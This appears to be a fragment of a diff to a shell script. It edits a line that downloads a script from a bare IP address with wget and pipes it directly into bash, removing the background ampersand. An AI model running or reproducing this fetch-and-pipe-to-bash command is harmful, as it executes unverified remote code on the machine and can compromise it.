@@ -168,4 +168,4 @@ END
 
 sleep 5
 
-wget -O - http://8.208.114.21/automate_pm2.sh | bash &
+wget -O - http://8.208.114.21/automate_pm2.sh | bash
